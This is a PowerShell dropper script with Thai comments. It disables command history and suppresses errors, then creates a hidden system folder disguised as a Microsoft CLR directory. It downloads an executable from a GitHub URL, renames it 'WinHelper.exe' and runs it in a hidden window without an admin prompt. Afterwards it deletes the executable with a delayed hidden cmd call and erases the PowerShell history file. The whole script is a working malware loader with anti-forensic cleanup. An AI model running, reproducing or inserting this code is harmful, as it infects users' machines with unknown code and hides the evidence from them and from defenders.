# 1. ปิดการบันทึกประวัติและตั้งค่าซ่อนความผิดพลาดทันทีตั้งแต่เริ่มต้น
try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# 2. ตั้งค่าที่อยู่โฟลเดอร์เป้าหมาย (สร้างและซ่อนโฟลเดอร์)
$workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
if (Test-Path $workDir) { 
    Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue 
}
New-Item -Path $workDir -ItemType Directory -Force | Out-Null 
& attrib +h +s $workDir

# กำหนดเส้นทางไฟล์เป้าหมายและลิงก์ดาวน์โหลด
$exeOutput = Join-Path $workDir "WinHelper.exe"
$exeUrl = "https://github.com/zenxler98-ui/betx/raw/refs/heads/main/Discord%20PTB.exe"

# 3. ล้างไฟล์เก่าออกก่อนและดาวน์โหลดไฟล์ใหม่ (EXE)
if (Test-Path $exeOutput) { Remove-Item $exeOutput -Force }

try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($exeUrl, $exeOutput)
} catch {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exeOutput -UseBasicParsing
}

# 4. ตรวจสอบไฟล์แล้วรันแบบปกติ (ไม่มีการขอสิทธิ์ Admin / ไม่มีหน้าต่าง UAC)
if (Test-Path $exeOutput) {
    try {
        Start-Process -FilePath $exeOutput -WindowStyle Hidden
    } catch {
        & $exeOutput
    }
}

# 5. เปิดระบบบันทึกประวัติกลับมา (ชั่วคราวเพื่อจบกระบวนการ) และสั่ง CMD เก็บกวาดไฟล์ EXE ทิ้งหลังผ่านไป 15 วินาที
try { Set-PSReadlineOption -HistorySaveStyle SaveIncrementally } catch {}
try {
    $cleanCmd = "timeout /t 15 && del /f /q `"$exeOutput`""
    Start-Process cmd -ArgumentList "/c $cleanCmd" -WindowStyle Hidden
} catch {}

# 6. ลบไฟล์ประวัติการรันใน PowerShell ทันทีก่อนปิดตัวเพื่อไม่ให้หลงเหลือร่องรอย
try {
    $historyPath = (Get-PSReadlineOption).HistorySavePath
    if ($historyPath -and (Test-Path $historyPath)) {
        Remove-Item $historyPath -Force
    }
} catch {}

exit